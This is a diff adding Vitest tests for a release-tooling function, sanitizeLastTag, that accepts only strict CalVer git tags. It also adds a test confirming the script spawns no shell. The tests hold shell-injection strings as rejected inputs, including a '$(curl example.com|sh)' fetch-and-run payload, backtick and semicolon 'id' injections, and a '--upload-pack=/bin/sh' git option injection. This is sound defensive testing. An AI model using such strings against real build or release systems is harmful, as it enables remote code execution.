@@ -1,7 +1,7 @@
 import { describe, it, expect } from "vitest";
 import { readFileSync } from "node:fs";
 import { resolve } from "node:path";
-import { isReleasable, SKIP_PATTERN_SOURCES } from "../releasable.js";
+import { isReleasable, sanitizeLastTag, SKIP_PATTERN_SOURCES } from "../releasable.js";
 
 describe("isReleasable", () => {
   it("returns true when there is no prior tag (first release)", () => {
@@ -56,6 +56,42 @@ describe("isReleasable", () => {
 
   it("'bumpversion' (no trailing space) is not a skip pattern", () => {
     expect(isReleasable(["bumpversion"])).toBe(true);
+  });
+});
+
+describe("sanitizeLastTag", () => {
+  it("passes through CalVer tags unchanged", () => {
+    expect(sanitizeLastTag("v2026.4.1")).toBe("v2026.4.1");
+    expect(sanitizeLastTag("v2026.12.10")).toBe("v2026.12.10");
+  });
+
+  it("rejects tags containing shell metacharacters", () => {
+    expect(sanitizeLastTag("v1.$(curl example.com|sh)")).toBe("");
+    expect(sanitizeLastTag("v2026.4.1`id`")).toBe("");
+    expect(sanitizeLastTag('v2026.4.1";id;"')).toBe("");
+  });
+
+  it("rejects tags that look like git options", () => {
+    expect(sanitizeLastTag("--upload-pack=/bin/sh")).toBe("");
+  });
+
+  it("rejects near-miss CalVer shapes", () => {
+    expect(sanitizeLastTag("")).toBe("");
+    expect(sanitizeLastTag("2026.4.1")).toBe("");
+    expect(sanitizeLastTag("v2026.4")).toBe("");
+    expect(sanitizeLastTag("v2026.4.1-rc1")).toBe("");
+    expect(sanitizeLastTag("v2026.4.1 ")).toBe("");
+  });
+});
+
+describe("check-releasable.ts shell safety", () => {
+  it("never spawns a shell (no execSync — argv-array execFileSync only)", () => {
+    const src = readFileSync(
+      resolve(process.cwd(), "scripts/release/check-releasable.ts"),
+      "utf8",
+    );
+    expect(src).not.toMatch(/\bexecSync\b/);
+    expect(src).toContain("execFileSync");
   });
 });
 
